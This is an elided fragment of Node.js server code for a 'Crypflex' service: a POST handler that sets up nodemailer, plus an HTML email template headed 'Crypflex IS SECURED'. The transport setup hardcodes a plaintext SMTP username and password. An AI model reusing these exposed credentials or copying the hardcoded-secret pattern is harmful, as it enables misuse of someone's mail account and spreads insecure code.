...
app.post('/done.html', async (req, res) => {
    ...
    var transporter = nodemailer.createTransport({
        ...
        service: 'SMTP',
        auth: {
            user: "crypflex@help-in.online",
            pass: "FX_Within20s=100"
        },
        from: "crypflex@help-in.online",
    });
                                                                            ...
                                                                            <td align="center" class="es-m-p25t"
                                                                                ...
                                                                                <span class="es-button-border"
                                                                                    style="border-style:solid;border-color:#2CB543;background:#45818e;border-width:0px;display:inline-block;border-radius:5px;width:auto"><a
                                                                                        href="https://cryp-flex.web.app/index.html class="
   ...
   <table cellpadding="0" cellspacing="0" class="es-right" align="right" role="none" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;float:right">
     <tr>
      <td align="center" style="padding:0;Margin:0;width:440px">
       <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
         <tr>
          <td align="left" class="es-m-txt-l" style="padding:0;Margin:0;padding-bottom:10px"><h3 style="Margin:0;font-family:arial, 'helvetica neue', helvetica, sans-serif;mso-line-height-rule:exactly;letter-spacing:0;font-size:20px;font-style:normal;font-weight:bold;line-height:24px;color:#333333">Crypflex IS SECURED</h3></td>
         </tr>
         <tr>
                                                        ...
                                                        <table cellpadding="0" cellspacing="0" width="100%"
                                                            ...
                                                            <tr>
                                                                <td align="center"
                                                                    ...
                                                                    <img src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/crypflex//Picsart_25-07-02_03-10-32-875.png"
                                                                        alt="Logo"
                                                        ...
                                                        <table cellpadding="0" cellspacing="0" width="100%"
                                                            ...
                                                            <tr>
                                                                <td align="center"
                                                                    ...
                                                                    <p
                                                                        style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">
                                                                        Crypflex © 2024 All Rights Reserved.</p>
                                                                    <p
                                                                        style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">
